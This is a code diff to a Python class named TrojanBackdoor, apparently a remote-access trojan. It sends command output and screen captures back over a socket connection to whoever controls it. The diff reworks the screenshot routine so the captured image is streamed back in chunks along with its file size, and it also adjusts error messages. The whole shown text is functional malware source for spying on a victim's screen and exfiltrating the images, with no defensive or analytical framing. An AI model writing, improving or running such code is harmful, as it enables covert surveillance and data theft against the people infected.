@@ -56,12 +56,12 @@ class TrojanBackdoor(threading.Thread):
             try:
                 self.conn.send(message.encode())
             except Exception as e:
-                print("Send message error: ", e)
+                print("Send empty string message error: ", e)
         elif isinstance(message, bytes):
             try:
-                self.conn.sendall(message)
+                self.conn.send(message)
             except Exception as e:
-                print("Send message error: ", e)
+                print("Send binary message error: ", e)
         else:
             try:
                 self.conn.send(message.encode())
@@ -78,12 +78,19 @@ class TrojanBackdoor(threading.Thread):
         else:
             self.send_message(std_err.decode())
 
-    def execute_screenshot(self):
-        pyscreeze.screenshot("screenshot.png")
-        size = os.path.getsize("screenshot.png")
-        with open("screenshot.png", "rb") as f:
-            self.send_message(f.read())
-        self.send_message("screenshot command Executed")
+    def execute_screenshot(self, image_name="screenshot.png"):
+        pyscreeze.screenshot(image_name)
+        size = os.path.getsize(image_name)
+        with open(image_name, "rb") as f:
+            data_part = f.read(self.int_buff)
+            while len(data_part) <= self.int_buff:
+                self.conn.send(data_part)
+                data_part = f.read(self.int_buff)
+                if len(data_part) < self.int_buff:
+                    self.conn.send(data_part)
+                    break
+        time.sleep(1)
+        self.send_message("screenshot command Executed, file size is: %s" % size)
 
     def backdoor_logic(self):
         while True:
